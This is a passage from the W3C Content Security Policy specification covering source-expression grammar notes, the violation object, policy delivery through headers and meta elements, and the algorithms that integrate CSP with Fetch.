    hash-algorithm = "sha256" / "sha384" / "sha512"

The [host-char](#grammardef-host-char){#ref-for-grammardef-host-char②
link-type="grammar"} production intentionally contains only ASCII
characters; internationalized domain names cannot be entered directly as
part of a [serialized CSP](#serialized-csp){#ref-for-serialized-csp①
link-type="dfn"}, but instead MUST be Punycode-encoded
[\[RFC3492\]](#biblio-rfc3492 "Punycode: A Bootstring encoding of Unicode for Internationalized Domain Names in Applications (IDNA)"){link-type="biblio"}.
For example, the domain `üüüüüü.de` MUST be represented as
`xn--tdaaaaaa.de`.

[Note:]{.marker} Though IP address do match the grammar above, only
`127.0.0.1` will actually match a URL when used in a source expression
(see [§ 6.7.2.7 Does url match source list in origin with redirect
count?](#match-url-to-source-list) for details). The security properties
of IP addresses are suspect, and authors ought to prefer hostnames
whenever possible.

[Note:]{.marker} The
[base64-value](#grammardef-base64-value){#ref-for-grammardef-base64-value②
link-type="grammar"} grammar allows both
[base64](https://tools.ietf.org/html/rfc4648#section-4){#ref-for-section-4
link-type="dfn"} and
[base64url](https://tools.ietf.org/html/rfc4648#section-5){#ref-for-section-5
link-type="dfn"} encoding. These encodings are treated as equivalant
when processing
[hash-source](#grammardef-hash-source){#ref-for-grammardef-hash-source①
link-type="grammar"} values. Nonces, however, are strict string matches:
we use the
[base64-value](#grammardef-base64-value){#ref-for-grammardef-base64-value③
link-type="grammar"} grammar to limit the characters available, and
reduce the complexity for the server-side operator (encodings, etc), but
the user agent doesn't actually care about any underlying value, nor
does it do any decoding of the
[nonce-source](#grammardef-nonce-source){#ref-for-grammardef-nonce-source①
link-type="grammar"} value.

### [2.4. ]{.secno}[Violations]{.content}[](#framework-violation){.self-link} {#framework-violation .heading .settled level="2.4"}

A [violation]{#violation .dfn .dfn-paneled dfn-type="dfn" export=""}
represents an action or resource which goes against the set of
[policy](#content-security-policy-object){#ref-for-content-security-policy-object①④
link-type="dfn"} objects associated with a [global
object](https://html.spec.whatwg.org/multipage/webappapis.html#global-object){#ref-for-global-object①
link-type="dfn"}.

Each [violation](#violation){#ref-for-violation link-type="dfn"} has a
[global object]{#violation-global-object .dfn .dfn-paneled
dfn-for="violation" dfn-type="dfn" export=""}, which is the [global
object](https://html.spec.whatwg.org/multipage/webappapis.html#global-object){#ref-for-global-object②
link-type="dfn"} whose
[policy](#content-security-policy-object){#ref-for-content-security-policy-object①⑤
link-type="dfn"} has been violated.

Each [violation](#violation){#ref-for-violation① link-type="dfn"} has a
[url]{#violation-url .dfn .dfn-paneled dfn-for="violation"
dfn-type="dfn" export=""} which is its [global
object](#violation-global-object){#ref-for-violation-global-object
link-type="dfn"}'s
[`URL`{.idl}](https://url.spec.whatwg.org/#url){#ref-for-url
link-type="idl"}.

Each [violation](#violation){#ref-for-violation② link-type="dfn"} has a
[status]{#violation-status .dfn .dfn-paneled dfn-for="violation"
dfn-type="dfn" export=""} which is a non-negative integer representing
the HTTP status code of the resource for which the global object was
instantiated.

Each [violation](#violation){#ref-for-violation③ link-type="dfn"} has a
[resource]{#violation-resource .dfn .dfn-paneled dfn-for="violation"
dfn-type="dfn" export=""}, which is either null, \"`inline`\",
\"`eval`\", \"`wasm-eval`\", \"`trusted-types-policy`\",
\"`trusted-types-sink`\" or a
[`URL`{.idl}](https://url.spec.whatwg.org/#url){#ref-for-url①
link-type="idl"}. It represents the resource which violated the policy.

[Note:]{.marker} The value null for a
[violation](#violation){#ref-for-violation④ link-type="dfn"}'s
[resource](#violation-resource){#ref-for-violation-resource
link-type="dfn"} is only allowed while the
[violation](#violation){#ref-for-violation⑤ link-type="dfn"} is being
populated. By the time the [violation](#violation){#ref-for-violation⑥
link-type="dfn"} is reported and its
[resource](#violation-resource){#ref-for-violation-resource①
link-type="dfn"} is used for [obtaining the blocked
URI](#obtain-violation-blocked-uri), the
[violation](#violation){#ref-for-violation⑦ link-type="dfn"}'s
[resource](#violation-resource){#ref-for-violation-resource②
link-type="dfn"} should be populated with a
[`URL`{.idl}](https://url.spec.whatwg.org/#url){#ref-for-url②
link-type="idl"} or one of the allowed strings.

Each [violation](#violation){#ref-for-violation⑧ link-type="dfn"} has a
[referrer]{#violation-referrer .dfn .dfn-paneled dfn-for="violation"
dfn-type="dfn" export=""}, which is either null, or a
[`URL`{.idl}](https://url.spec.whatwg.org/#url){#ref-for-url③
link-type="idl"}. It represents the referrer of the resource whose
policy was violated.

Each [violation](#violation){#ref-for-violation⑨ link-type="dfn"} has a
[policy]{#violation-policy .dfn .dfn-paneled dfn-for="violation"
dfn-type="dfn" export=""}, which is the
[policy](#content-security-policy-object){#ref-for-content-security-policy-object①⑥
link-type="dfn"} that has been violated.

Each [violation](#violation){#ref-for-violation①⓪ link-type="dfn"} has a
[disposition]{#violation-disposition .dfn .dfn-paneled
dfn-for="violation" dfn-type="dfn" export=""}, which is the
[disposition](#policy-disposition){#ref-for-policy-disposition④
link-type="dfn"} of the
[policy](#content-security-policy-object){#ref-for-content-security-policy-object①⑦
link-type="dfn"} that has been violated.

Each [violation](#violation){#ref-for-violation①① link-type="dfn"} has
an [effective directive]{#violation-effective-directive .dfn
.dfn-paneled dfn-for="violation" dfn-type="dfn" export=""} which is a
non-empty string representing the
[directive](#directives){#ref-for-directives⑥ link-type="dfn"} whose
enforcement caused the violation.

Each [violation](#violation){#ref-for-violation①② link-type="dfn"} has a
[source file]{#violation-source-file .dfn .dfn-paneled
dfn-for="violation" dfn-type="dfn" export=""}, which is either null or a
[`URL`{.idl}](https://url.spec.whatwg.org/#url){#ref-for-url④
link-type="idl"}.

Each [violation](#violation){#ref-for-violation①③ link-type="dfn"} has a
[line number]{#violation-line-number .dfn .dfn-paneled
dfn-for="violation" dfn-type="dfn" export=""}, which is a non-negative
integer.

Each [violation](#violation){#ref-for-violation①④ link-type="dfn"} has a
[column number]{#violation-column-number .dfn .dfn-paneled
dfn-for="violation" dfn-type="dfn" export=""}, which is a non-negative
integer.

Each [violation](#violation){#ref-for-violation①⑤ link-type="dfn"} has a
[element]{#violation-element .dfn .dfn-paneled dfn-for="violation"
dfn-type="dfn" export=""}, which is either null or an element.

Each [violation](#violation){#ref-for-violation①⑥ link-type="dfn"} has a
[sample]{#violation-sample .dfn .dfn-paneled dfn-for="violation"
dfn-type="dfn" export=""}, which is a string. It is the empty string
unless otherwise specified.

[Note:]{.marker} A [violation](#violation){#ref-for-violation①⑦
link-type="dfn"}'s
[sample](#violation-sample){#ref-for-violation-sample① link-type="dfn"}
will be populated with the first 40 characters of an inline script,
event handler, or style that caused an violation. Violations which stem
from an external file will not include a sample in the violation report.

#### [2.4.1. ]{.secno}[ Create a violation object for `global`{.variable}, `policy`{.variable}, and `directive`{.variable} ]{.content}[](#create-violation-for-global){.self-link} {#create-violation-for-global .algorithm .heading .settled algorithm="Create a violation object for global, policy, and directive" level="2.4.1"}

Given a [global
object](https://html.spec.whatwg.org/multipage/webappapis.html#global-object){#ref-for-global-object③
link-type="dfn"} `global`{.variable}, a
[policy](#content-security-policy-object){#ref-for-content-security-policy-object①⑧
link-type="dfn"} `policy`{.variable}, and a
[string](https://infra.spec.whatwg.org/#string){#ref-for-string⑤
link-type="dfn"} `directive`{.variable}, the following algorithm creates
a new [violation](#violation){#ref-for-violation①⑧ link-type="dfn"}
object, and populates it with an initial set of data:

1.  Let `violation`{.variable} be a new
    [violation](#violation){#ref-for-violation①⑨ link-type="dfn"} whose
    [global
    object](#violation-global-object){#ref-for-violation-global-object①
    link-type="dfn"} is `global`{.variable},
    [policy](#violation-policy){#ref-for-violation-policy
    link-type="dfn"} is `policy`{.variable}, [effective
    directive](#violation-effective-directive){#ref-for-violation-effective-directive
    link-type="dfn"} is `directive`{.variable}, and
    [resource](#violation-resource){#ref-for-violation-resource③
    link-type="dfn"} is null.

2.  If the user agent is currently executing script, and can extract a
    source file's URL, line number, and column number from the
    `global`{.variable}, set `violation`{.variable}'s [source
    file](#violation-source-file){#ref-for-violation-source-file
    link-type="dfn"}, [line
    number](#violation-line-number){#ref-for-violation-line-number
    link-type="dfn"}, and [column
    number](#violation-column-number){#ref-for-violation-column-number
    link-type="dfn"} accordingly.

    [](#issue-ee968c9a){.self-link} Is this kind of thing specified
    anywhere? I didn't see anything that looked useful in
    [\[ECMA262\]](#biblio-ecma262 "ECMAScript® Language Specification"){link-type="biblio"}.

    [Note:]{.marker} User agents need to ensure that the [source
    file](#violation-source-file){#ref-for-violation-source-file①
    link-type="dfn"} is the URL requested by the page, pre-redirects. If
    that's not possible, user agents need to strip the URL down to an
    origin to avoid unintentional leakage.

3.  If `global`{.variable} is a
    [`Window`{.idl}](https://html.spec.whatwg.org/multipage/nav-history-apis.html#window){#ref-for-window
    link-type="idl"} object, set `violation`{.variable}'s
    [referrer](#violation-referrer){#ref-for-violation-referrer
    link-type="dfn"} to `global`{.variable}'s
    [document](https://html.spec.whatwg.org/multipage/nav-history-apis.html#concept-document-window){#ref-for-concept-document-window
    link-type="dfn"}'s
    [`referrer`{.idl}](https://html.spec.whatwg.org/multipage/dom.html#dom-document-referrer){#ref-for-dom-document-referrer
    link-type="idl"}.

4.  Set `violation`{.variable}'s
    [status](#violation-status){#ref-for-violation-status
    link-type="dfn"} to the HTTP status code for the resource associated
    with `violation`{.variable}'s [global
    object](#violation-global-object){#ref-for-violation-global-object②
    link-type="dfn"}.

    [](#issue-d43ce829){.self-link} How, exactly, do we get the status
    code? We don't actually store it anywhere.

5.  Return `violation`{.variable}.

#### [2.4.2. ]{.secno}[ Create a violation object for `request`{.variable}, and `policy`{.variable}. ]{.content}[](#create-violation-for-request){.self-link} {#create-violation-for-request .algorithm .heading .settled algorithm="Create a violation object for request, and policy." level="2.4.2"}

Given a
[request](https://fetch.spec.whatwg.org/#concept-request){#ref-for-concept-request④
link-type="dfn"} `request`{.variable}, a
[policy](#content-security-policy-object){#ref-for-content-security-policy-object①⑨
link-type="dfn"} `policy`{.variable}, the following algorithm creates a
new [violation](#violation){#ref-for-violation②⓪ link-type="dfn"}
object, and populates it with an initial set of data:

1.  Let `directive`{.variable} be the result of executing [§ 6.8.1 Get
    the effective directive for
    request](#effective-directive-for-a-request) on
    `request`{.variable}.

2.  Let `violation`{.variable} be the result of executing [§ 2.4.1
    Create a violation object for global, policy, and
    directive](#create-violation-for-global) on `request`{.variable}'s
    [client](https://fetch.spec.whatwg.org/#concept-request-client){#ref-for-concept-request-client
    link-type="dfn"}'s [global
    object](https://html.spec.whatwg.org/multipage/webappapis.html#concept-settings-object-global){#ref-for-concept-settings-object-global
    link-type="dfn"}, `policy`{.variable}, and `directive`{.variable}.

3.  Set `violation`{.variable}'s
    [resource](#violation-resource){#ref-for-violation-resource④
    link-type="dfn"} to `request`{.variable}'s
    [url](https://fetch.spec.whatwg.org/#concept-request-url){#ref-for-concept-request-url
    link-type="dfn"}.

    [Note:]{.marker} We use `request`{.variable}'s
    [url](https://fetch.spec.whatwg.org/#concept-request-url){#ref-for-concept-request-url①
    link-type="dfn"}, and *not* its [current
    url](https://fetch.spec.whatwg.org/#concept-request-current-url){#ref-for-concept-request-current-url
    link-type="dfn"}, as the latter might contain information about
    redirect targets to which the page MUST NOT be given access.

4.  Return `violation`{.variable}.
:::

:::::: section
## [3. ]{.secno}[ Policy Delivery ]{.content}[](#policy-delivery){.self-link} {#policy-delivery .heading .settled level="3"}

A server MAY declare a
[policy](#content-security-policy-object){#ref-for-content-security-policy-object②⓪
link-type="dfn"} for a particular [resource
representation](https://tools.ietf.org/html/rfc9110#section-3.2){#ref-for-section-3.2
link-type="dfn"} via an HTTP response header field whose value is a
[serialized CSP](#serialized-csp){#ref-for-serialized-csp②
link-type="dfn"}. This mechanism is defined in detail in [§ 3.1 The
Content-Security-Policy HTTP Response Header Field](#csp-header) and
[§ 3.2 The Content-Security-Policy-Report-Only HTTP Response Header
Field](#cspro-header), and the integration with Fetch and HTML is
described in [§ 4.1 Integration with Fetch](#fetch-integration) and
[§ 4.2 Integration with HTML](#html-integration).

A
[policy](#content-security-policy-object){#ref-for-content-security-policy-object②①
link-type="dfn"} may also be declared inline in an HTML document via a
[`meta`](https://html.spec.whatwg.org/multipage/semantics.html#meta){#ref-for-meta
link-type="element"} element's
[`http-equiv`](https://html.spec.whatwg.org/multipage/semantics.html#attr-meta-http-equiv){#ref-for-attr-meta-http-equiv
link-type="element-sub"} attribute, as described in [§ 3.3 The \<meta\>
element](#meta-element).

### [3.1. ]{.secno}[ The `Content-Security-Policy` HTTP Response Header Field ]{.content}[](#csp-header){.self-link} {#csp-header .heading .settled level="3.1"}

The [`Content-Security-Policy`]{#header-content-security-policy .dfn
.dfn-paneled dfn-type="http-header" export=""} HTTP response header
field is the preferred mechanism for delivering a policy from a server
to a client. The header's value is represented by the following ABNF
[\[RFC5234\]](#biblio-rfc5234 "Augmented BNF for Syntax Specifications: ABNF"){link-type="biblio"}:

    Content-Security-Policy = 1#serialized-policy
                        ; The '#' rule is the one defined in section 5.6.1 of RFC 9110
                        ; but it incorporates the modifications specified
                        ; in section 2.1 of this document.

::: {#example-b2d2c295 .example}
[](#example-b2d2c295){.self-link}

    Content-Security-Policy: script-src 'self';
                             report-to csp-reporting-endpoint
:::

A server MAY send different `Content-Security-Policy` header field
values with different
[representations](https://tools.ietf.org/html/rfc9110#section-3.2){#ref-for-section-3.2①
link-type="dfn" refhint-key="b1744823"} of the same resource.

When the user agent receives a `Content-Security-Policy` header field,
it MUST
[parse](#abstract-opdef-parse-a-serialized-csp){#ref-for-abstract-opdef-parse-a-serialized-csp②
link-type="abstract-op"} and [enforce](#enforced){#ref-for-enforced
link-type="dfn"} each [serialized
CSP](#serialized-csp){#ref-for-serialized-csp③ link-type="dfn"} it
contains as described in [§ 4.1 Integration with
Fetch](#fetch-integration), [§ 4.2 Integration with
HTML](#html-integration).

### [3.2. ]{.secno}[ The `Content-Security-Policy-Report-Only` HTTP Response Header Field ]{.content}[](#cspro-header){.self-link} {#cspro-header .heading .settled level="3.2"}

The
[`Content-Security-Policy-Report-Only`]{#header-content-security-policy-report-only
.dfn .dfn-paneled dfn-type="http-header" export=""} HTTP response header
field allows web developers to experiment with policies by monitoring
(but not enforcing) their effects. The header's value is represented by
the following ABNF
[\[RFC5234\]](#biblio-rfc5234 "Augmented BNF for Syntax Specifications: ABNF"){link-type="biblio"}:

    Content-Security-Policy-Report-Only = 1#serialized-policy
                        ; The '#' rule is the one defined in section 5.6.1 of RFC 9110
                        ; but it incorporates the modifications specified
                        ; in section 2.1 of this document.

This header field allows developers to piece together their security
policy in an iterative fashion, deploying a report-only policy based on
their best estimate of how their site behaves, watching for violation
reports, and then moving to an enforced policy once they've gained
confidence in that behavior.

::: {#example-5899b4f0 .example}
[](#example-5899b4f0){.self-link}

    Content-Security-Policy-Report-Only: script-src 'self';
                                         report-to csp-reporting-endpoint
:::

A server MAY send different `Content-Security-Policy-Report-Only` header
field values with different
[representations](https://tools.ietf.org/html/rfc9110#section-3.2){#ref-for-section-3.2②
link-type="dfn" refhint-key="b1744823"} of the same resource.

When the user agent receives a `Content-Security-Policy-Report-Only`
header field, it MUST
[parse](#abstract-opdef-parse-a-serialized-csp){#ref-for-abstract-opdef-parse-a-serialized-csp③
link-type="abstract-op"} and [monitor](#monitored){#ref-for-monitored
link-type="dfn"} each [serialized
CSP](#serialized-csp){#ref-for-serialized-csp④ link-type="dfn"} it
contains as described in [§ 4.1 Integration with
Fetch](#fetch-integration) and [§ 4.2 Integration with
HTML](#html-integration).

[Note:]{.marker} The
[`Content-Security-Policy-Report-Only`](#header-content-security-policy-report-only){#ref-for-header-content-security-policy-report-only①
link-type="http-header"} header is **not** supported inside a
[`meta`](https://html.spec.whatwg.org/multipage/semantics.html#meta){#ref-for-meta①
link-type="element"} element.

### [3.3. ]{.secno}[ The `<meta>` element ]{.content}[](#meta-element){.self-link} {#meta-element .heading .settled level="3.3"}

A
[`Document`{.idl}](https://dom.spec.whatwg.org/#document){#ref-for-document③
link-type="idl"} may deliver a policy via one or more HTML
[`meta`](https://html.spec.whatwg.org/multipage/semantics.html#meta){#ref-for-meta②
link-type="element"} elements whose
[`http-equiv`](https://html.spec.whatwg.org/multipage/semantics.html#attr-meta-http-equiv){#ref-for-attr-meta-http-equiv①
link-type="element-sub"} attributes are an [ASCII
case-insensitive](https://infra.spec.whatwg.org/#ascii-case-insensitive){#ref-for-ascii-case-insensitive
link-type="dfn"} match for the string \"`Content-Security-Policy`\". For
example:

::: {#example-5b9d2837 .example}
[](#example-5b9d2837){.self-link}

``` highlight
<meta http-equiv="Content-Security-Policy" content="script-src 'self'">
```
:::

Implementation details can be found in HTML's [Content Security Policy
state](https://html.spec.whatwg.org/#attr-meta-http-equiv-content-security-policy){#ref-for-attr-meta-http-equiv-content-security-policy
link-type="dfn"} `http-equiv` processing instructions
[\[HTML\]](#biblio-html "HTML Standard"){link-type="biblio"}.

[Note:]{.marker} The
[`Content-Security-Policy-Report-Only`](#header-content-security-policy-report-only){#ref-for-header-content-security-policy-report-only②
link-type="http-header"} header is *not* supported inside a
[`meta`](https://html.spec.whatwg.org/multipage/semantics.html#meta){#ref-for-meta③
link-type="element"} element. Neither are the `report-uri`,
`frame-ancestors`, and `sandbox` directives.

Authors are *strongly encouraged* to place
[`meta`](https://html.spec.whatwg.org/multipage/semantics.html#meta){#ref-for-meta④
link-type="element"} elements as early in the document as possible,
because policies in
[`meta`](https://html.spec.whatwg.org/multipage/semantics.html#meta){#ref-for-meta⑤
link-type="element"} elements are not applied to content which precedes
them. In particular, note that resources fetched or prefetched using the
`Link` HTTP response header field, and resources fetched or prefetched
using
[`link`](https://html.spec.whatwg.org/multipage/semantics.html#the-link-element){#ref-for-the-link-element
link-type="element"} and
[`script`](https://html.spec.whatwg.org/multipage/scripting.html#script){#ref-for-script②
link-type="element"} elements which precede a
[`meta`](https://html.spec.whatwg.org/multipage/semantics.html#meta){#ref-for-meta⑥
link-type="element"}-delivered policy will not be blocked.

[Note:]{.marker} A policy specified via a
[`meta`](https://html.spec.whatwg.org/multipage/semantics.html#meta){#ref-for-meta⑦
link-type="element"} element will be enforced along with any other
policies active for the protected resource, regardless of where they're
specified. The general impact of enforcing multiple policies is
described in [§ 8.1 The effect of multiple
policies](#multiple-policies).

[Note:]{.marker} Modifications to the
[`content`](https://html.spec.whatwg.org/multipage/semantics.html#attr-meta-content){#ref-for-attr-meta-content
link-type="element-sub"} attribute of a
[`meta`](https://html.spec.whatwg.org/multipage/semantics.html#meta){#ref-for-meta⑧
link-type="element"} element after the element has been parsed will be
ignored.
::::::

::: section
## [4. ]{.secno}[Integrations]{.content}[](#integrations){.self-link} {#integrations .heading .settled level="4"}

*This section is non-normative.*

This document defines a set of algorithms which are used in other
specifications in order to implement the functionality. These
integrations are outlined here for clarity, but those external documents
are the normative references which ought to be consulted for detailed
information.

### [4.1. ]{.secno}[ Integration with Fetch ]{.content}[](#fetch-integration){.self-link} {#fetch-integration .heading .settled level="4.1"}

A number of [directives](#directives){#ref-for-directives⑦
link-type="dfn"} control resource loading in one way or another. This
specification provides algorithms which allow Fetch to make decisions
about whether or not a particular
[request](https://fetch.spec.whatwg.org/#concept-request){#ref-for-concept-request⑤
link-type="dfn"} should be blocked or allowed, and about whether a
particular
[response](https://fetch.spec.whatwg.org/#concept-response){#ref-for-concept-response③
link-type="dfn"} should be replaced with a [network
error](https://fetch.spec.whatwg.org/#concept-network-error){#ref-for-concept-network-error
link-type="dfn"}.

1.  [§ 4.1.2 Should request be blocked by Content Security
    Policy?](#should-block-request){#ref-for-should-block-request①} is
    called as part of step 2.4 of the [Main
    Fetch](https://fetch.spec.whatwg.org/#concept-main-fetch){#ref-for-concept-main-fetch
    link-type="dfn"} algorithm. This allows directives\' [pre-request
    checks](#directive-pre-request-check){#ref-for-directive-pre-request-check
    link-type="dfn"} to be executed against each
    [request](https://fetch.spec.whatwg.org/#concept-request){#ref-for-concept-request⑥
    link-type="dfn"} before it hits the network, and against each
    redirect that a
    [request](https://fetch.spec.whatwg.org/#concept-request){#ref-for-concept-request⑦
    link-type="dfn"} might go through on its way to reaching a resource.

2.  [§ 4.1.3 Should response to request be blocked by Content Security
    Policy?](#should-block-response){#ref-for-should-block-response①} is
    called as part of step 11 of the [Main
    Fetch](https://fetch.spec.whatwg.org/#concept-main-fetch){#ref-for-concept-main-fetch①
    link-type="dfn"} algorithm. This allows directives\' [post-request
    checks](#directive-post-request-check){#ref-for-directive-post-request-check
    link-type="dfn"} to be executed on the
    [response](https://fetch.spec.whatwg.org/#concept-response){#ref-for-concept-response④
    link-type="dfn"} delivered from the network or from a Service
    Worker.

#### [4.1.1. ]{.secno}[ Report Content Security Policy violations for `request`{.variable} ]{.content}[](#report-for-request){#ref-for-report-for-request .self-link} {#report-for-request .algorithm .dfn-paneled .heading .settled algorithm="Report Content Security Policy violations for request" dfn-type="dfn" export="" level="4.1.1" lt="Report Content Security Policy violations for request"}

Given a
[request](https://fetch.spec.whatwg.org/#concept-request){#ref-for-concept-request⑧
link-type="dfn"} `request`{.variable}, this algorithm reports violations
based on [policy
container](https://fetch.spec.whatwg.org/#concept-request-policy-container){#ref-for-concept-request-policy-container
link-type="dfn"}'s [CSP
list](https://html.spec.whatwg.org/multipage/browsers.html#policy-container-csp-list){#ref-for-policy-container-csp-list
link-type="dfn"} \"report only\" policies.

1.  Let `CSP list`{.variable} be `request`{.variable}'s [policy
    container](https://fetch.spec.whatwg.org/#concept-request-policy-container){#ref-for-concept-request-policy-container①
    link-type="dfn"}'s [CSP
    list](https://html.spec.whatwg.org/multipage/browsers.html#policy-container-csp-list){#ref-for-policy-container-csp-list①
    link-type="dfn"}.

2.  [For
    each](https://infra.spec.whatwg.org/#list-iterate){#ref-for-list-iterate④
    link-type="dfn"} `policy`{.variable} of `CSP list`{.variable}:

    1.  If `policy`{.variable}'s
        [disposition](#policy-disposition){#ref-for-policy-disposition⑤
        link-type="dfn"} is \"`enforce`\", then skip to the next
        `policy`{.variable}.

    2.  Let `violates`{.variable} be the result of executing [§ 6.7.2.1
        Does request violate policy?](#does-request-violate-policy) on
        `request`{.variable} and `policy`{.variable}.

    3.  If `violates`{.variable} is not \"`Does Not Violate`\", then
        execute [§ 5.5 Report a violation](#report-violation) on the
        result of executing [§ 2.4.2 Create a violation object for
        request, and policy.](#create-violation-for-request) on
        `request`{.variable}, and `policy`{.variable}.

#### [4.1.2. ]{.secno}[ Should `request`{.variable} be blocked by Content Security Policy? ]{.content}[](#should-block-request){#ref-for-should-block-request② .self-link} {#should-block-request .algorithm .dfn-paneled .heading .settled algorithm="Should request be blocked by Content Security Policy?" dfn-type="dfn" export="" level="4.1.2" lt="Should request be blocked by Content Security Policy?"}

Given a
[request](https://fetch.spec.whatwg.org/#concept-request){#ref-for-concept-request⑨
link-type="dfn"} `request`{.variable}, this algorithm returns `Blocked`
or `Allowed` and reports violations based on `request`{.variable}'s
[policy
container](https://fetch.spec.whatwg.org/#concept-request-policy-container){#ref-for-concept-request-policy-container②
link-type="dfn"}'s [CSP
list](https://html.spec.whatwg.org/multipage/browsers.html#policy-container-csp-list){#ref-for-policy-container-csp-list②
link-type="dfn"}.

1.  Let `CSP list`{.variable} be `request`{.variable}'s [policy
    container](https://fetch.spec.whatwg.org/#concept-request-policy-container){#ref-for-concept-request-policy-container③
    link-type="dfn"}'s [CSP
    list](https://html.spec.whatwg.org/multipage/browsers.html#policy-container-csp-list){#ref-for-policy-container-csp-list③
    link-type="dfn"}.

2.  Let `result`{.variable} be \"`Allowed`\".

3.  [For
    each](https://infra.spec.whatwg.org/#list-iterate){#ref-for-list-iterate⑤
    link-type="dfn"} `policy`{.variable} of `CSP list`{.variable}:

    1.  If `policy`{.variable}'s
        [disposition](#policy-disposition){#ref-for-policy-disposition⑥
        link-type="dfn"} is \"`report`\", then skip to the next
        `policy`{.variable}.

    2.  Let `violates`{.variable} be the result of executing [§ 6.7.2.1
        Does request violate policy?](#does-request-violate-policy) on
        `request`{.variable} and `policy`{.variable}.

    3.  If `violates`{.variable} is not \"`Does Not Violate`\", then:

        1.  Execute [§ 5.5 Report a violation](#report-violation) on the
            result of executing [§ 2.4.2 Create a violation object for
            request, and policy.](#create-violation-for-request) on
            `request`{.variable}, and `policy`{.variable}.

        2.  Set `result`{.variable} to \"`Blocked`\".

4.  Return `result`{.variable}.

#### [4.1.3. ]{.secno}[ Should `response`{.variable} to `request`{.variable} be blocked by Content Security Policy? ]{.content}[](#should-block-response){#ref-for-should-block-response② .self-link} {#should-block-response .algorithm .dfn-paneled .heading .settled algorithm="Should response to request be blocked by Content Security Policy?" dfn-type="dfn" export="" level="4.1.3" lt="Should response to request be blocked by Content Security Policy?"}

Given a
[response](https://fetch.spec.whatwg.org/#concept-response){#ref-for-concept-response⑤
link-type="dfn"} `response`{.variable} and a
[request](https://fetch.spec.whatwg.org/#concept-request){#ref-for-concept-request①⓪
link-type="dfn"} `request`{.variable}, this algorithm returns `Blocked`
or `Allowed`, and reports violations based on `request`{.variable}'s
[policy
container](https://fetch.spec.whatwg.org/#concept-request-policy-container){#ref-for-concept-request-policy-container④
link-type="dfn"}'s [CSP
list](https://html.spec.whatwg.org/multipage/browsers.html#policy-container-csp-list){#ref-for-policy-container-csp-list④
link-type="dfn"}.

1.  Let `CSP list`{.variable} be `request`{.variable}'s [policy
    container](https://fetch.spec.whatwg.org/#concept-request-policy-container){#ref-for-concept-request-policy-container⑤
    link-type="dfn"}'s [CSP
    list](https://html.spec.whatwg.org/multipage/browsers.html#policy-container-csp-list){#ref-for-policy-container-csp-list⑤
    link-type="dfn"}.

2.  Let `result`{.variable} be \"`Allowed`\".

3.  [For
    each](https://infra.spec.whatwg.org/#list-iterate){#ref-for-list-iterate⑥
    link-type="dfn"} `policy`{.variable} of `CSP list`{.variable}:

    1.  [For
        each](https://infra.spec.whatwg.org/#list-iterate){#ref-for-list-iterate⑦
        link-type="dfn"} `directive`{.variable} of `policy`{.variable}:

        1.  If the result of executing `directive`{.variable}'s
            [post-request
            check](#directive-post-request-check){#ref-for-directive-post-request-check①
            link-type="dfn"} is \"`Blocked`\", then:

            1.  Execute [§ 5.5 Report a violation](#report-violation) on
                the result of executing [§ 2.4.2 Create a violation
                object for request, and
                policy.](#create-violation-for-request) on
                `request`{.variable}, and `policy`{.variable}.

            2.  If `policy`{.variable}'s
                [disposition](#policy-disposition){#ref-for-policy-disposition⑦
                link-type="dfn"} is \"`enforce`\", then set
                `result`{.variable} to \"`Blocked`\".

    [Note:]{.marker} This portion of the check verifies that the page
    can load the response. That is, that a Service Worker hasn't
    substituted a file which would violate the page's CSP.

4.  Return `result`{.variable}.

#### [4.1.4. ]{.secno}[Potentially report hash]{.content}[](#potentially-report-hash){#ref-for-potentially-report-hash .self-link} {#potentially-report-hash .algorithm .dfn-paneled .heading .settled algorithm="Potentially report hash" dfn-type="dfn" export="" level="4.1.4" lt="Potentially report hash"}

Given a
[response](https://fetch.spec.whatwg.org/#concept-response){#ref-for-concept-response⑥
link-type="dfn"} `response`{.variable}, a
[request](https://fetch.spec.whatwg.org/#concept-request){#ref-for-concept-request①①
link-type="dfn"} `request`{.variable}, a
[directive](#directives){#ref-for-directives⑧ link-type="dfn"}
`directive`{.variable} and a [content security policy
object](#content-security-policy-object){#ref-for-content-security-policy-object②②
link-type="dfn"} `policy`{.variable}, run the following steps:

1.  Let `algorithm`{.variable} be the empty
    [string](https://infra.spec.whatwg.org/#string){#ref-for-string⑥
    link-type="dfn"}.

2.  If `directive`{.variable}'s
    [value](#directive-value){#ref-for-directive-value④ link-type="dfn"}
    [contains](https://infra.spec.whatwg.org/#list-contain){#ref-for-list-contain①
    link-type="dfn"} the expression
    \"[`'report-sha256'`](#grammardef-report-sha256){#ref-for-grammardef-report-sha256
    link-type="grammar"}\", set `algorithm`{.variable} to \"sha256\".

3.  If `directive`{.variable}'s
    [value](#directive-value){#ref-for-directive-value⑤ link-type="dfn"}
    [contains](https://infra.spec.whatwg.org/#list-contain){#ref-for-list-contain②
    link-type="dfn"} the expression
    \"[`'report-sha384'`](#grammardef-report-sha384){#ref-for-grammardef-report-sha384
    link-type="grammar"}\", set `algorithm`{.variable} to \"sha384\".

4.  If `directive`{.variable}'s
    [value](#directive-value){#ref-for-directive-value⑥ link-type="dfn"}
    [contains](https://infra.spec.whatwg.org/#list-contain){#ref-for-list-contain③
    link-type="dfn"} the expression
    \"[`'report-sha512'`](#grammardef-report-sha512){#ref-for-grammardef-report-sha512
    link-type="grammar"}\", set `algorithm`{.variable} to \"sha512\".

5.  If `algorithm`{.variable} is the empty
    [string](https://infra.spec.whatwg.org/#string){#ref-for-string⑦
    link-type="dfn"}, return.

6.  Let `hash`{.variable} be the empty
    [string](https://infra.spec.whatwg.org/#string){#ref-for-string⑧
    link-type="dfn"}.

7.  If `response`{.variable} is
    [CORS-same-origin](https://html.spec.whatwg.org/multipage/urls-and-fetching.html#cors-same-origin){#ref-for-cors-same-origin
    link-type="dfn"}, then:

    1.  Let `h`{.variable} be the result of [applying algorithm to
        bytes](https://w3c.github.io/webappsec-subresource-integrity#apply-algorithm-to-response){#ref-for-apply-algorithm-to-response
        link-type="dfn"} on `response`{.variable}'s
        [body](https://fetch.spec.whatwg.org/#concept-response-body){#ref-for-concept-response-body
        link-type="dfn"} and `algorithm`{.variable}.

    2.  Let `hash`{.variable} be the
        [concatenation](https://infra.spec.whatwg.org/#string-concatenate){#ref-for-string-concatenate
        link-type="dfn"} of `algorithm`{.variable}, U+2D (-), and
        `h`{.variable}.

8.  Let `global`{.variable} be the `request`{.variable}'s
    [client](https://fetch.spec.whatwg.org/#concept-request-client){#ref-for-concept-request-client①
    link-type="dfn"}'s [global
    object](https://html.spec.whatwg.org/multipage/webappapis.html#global-object){#ref-for-global-object④
    link-type="dfn"}.

